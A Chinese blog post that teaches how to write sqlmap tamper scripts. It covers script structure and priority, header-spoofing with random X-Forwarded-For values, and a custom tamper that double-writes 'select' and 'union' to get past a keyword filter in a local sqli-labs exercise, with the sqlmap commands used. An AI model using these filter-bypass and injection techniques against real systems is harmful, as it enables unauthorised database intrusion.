---
title: "Sqlmap Tamper 编写"
date: 2019-11-18T21:20:09+08:00
draft: false
tags: []
categories: ['渗透测试']
---

从零开始写tamper
<!--more-->

## 简单介绍tamper
sqlmap的`--tamper`参数可以引入用户自定义的脚本来修改注入时的payload，由此可以使用tamper来绕过waf，替换被过滤的关键字等。这是一个基本的tamper结构
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
    pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    return payload
```
需要把他保存为 `my.py` 放入 `sqlmap\tamper` 路径下，然后使用的时候加上参数 `--tamper=my` 就行了

## 简单分析
拿官方的一个tamper来分析下结构
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import random

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def randomIP():
    numbers = []

    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(xrange(1, 255), 4)

    return '.'.join(str(_) for _ in numbers)

def tamper(payload, **kwargs):
    """
    Append a fake HTTP header 'X-Forwarded-For'
    """

    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    return payload
```
分为了import部分、`__priority__` 属性、dependencies函数、tamper函数以及用户自定义的函数

## import
这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的`PRIORITY`就来源于`sqlmap/lib/core/enums.py`

### PRIORITY
PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:

- LOWEST = -100
- LOWER = -50
- LOW = -10
- NORMAL = 0
- HIGH = 10
- HIGHER = 50
- HIGHEST = 100

如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。

## dependencies
dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:
```python
#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

__priority__ = PRIORITY.NORMAL

def dependencies():
    singleTimeWarnMessage("这是我的tamper提示")

def tamper(payload, **kwargs):
    return payload
```
![20191118212606](https://y4er.com/img/uploads/20191118212606.png)

DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个`\sqlmap\lib\core\enums.py`
![20191118212624](https://y4er.com/img/uploads/20191118212624.png)

## Tamper
tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个

### 基于payload
先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图
![20191118212641](https://y4er.com/img/uploads/20191118212641.png)

编写tamper来双写绕过
```python
def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace('select','seleselectct')
    payload = payload.replace('union','ununionion')
    return payload
```
没有使用tamper之前，我们加上`--tech=U`来让sqlmap只测试联合查询注入，`--flush-session`意思是每次刷新会话，清理上次的缓存。
```
sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql
```
![20191118212702](https://y4er.com/img/uploads/20191118212702.png)

从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后
```
sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql
```
![20191118212747](https://y4er.com/img/uploads/20191118212747.png)

payload正常双写，可以注入
![20191118212800](https://y4er.com/img/uploads/20191118212800.png)

### 基于http头

我们使用`sqlmap\tamper\xforwardedfor.py`的tamper来讲解
```python
def tamper(payload, **kwargs):
    """
    Append a fake HTTP header 'X-Forwarded-For'
    """

    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    return payload
```
从`kwargs`中取出`headers`数组，然后修改了xff值达到随机IP的效果，不再赘述。

## 总结

本文简单介绍了tamper的编写，并使用双写做了实例演示，在实际的渗透测试中，我们需要针对不同的waf来编写不同的tamper来灵活使用。

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

